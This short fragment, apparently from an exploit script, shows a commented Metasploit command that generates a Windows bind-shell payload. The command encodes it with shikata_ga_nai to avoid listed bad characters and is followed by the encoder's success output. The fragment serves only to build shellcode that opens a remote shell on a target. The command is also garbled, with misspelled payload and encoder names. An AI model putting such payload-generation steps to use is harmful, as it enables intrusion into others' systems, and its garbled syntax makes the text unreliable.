...
#./msfpayload window//shell_bind_lind_tcp r | ./msfencode -e x86/shikata_ga_nai -b "\x00\xff\x0d\x0a\x3d\x20"
#[*] x86/shikata_ga_ni succeeded with size 368 (iteration=1)
